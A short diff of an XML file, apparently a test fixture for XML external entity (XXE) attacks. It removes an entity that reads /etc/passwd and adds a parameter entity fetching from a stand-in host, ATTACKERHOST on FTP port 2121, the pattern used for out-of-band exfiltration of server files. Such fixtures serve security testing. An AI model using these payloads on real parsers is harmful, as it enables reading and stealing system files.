@@ -1,5 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [
-<!ENTITY % a SYSTEM "file:///etc/passwd">
-%a;
+<!DOCTYPE test [   
+  <!ENTITY % one SYSTEM "ftp://ATTACKERHOST:2121/">
+  %one;
+  %two;
+  %four;
+  %five;
 ]>
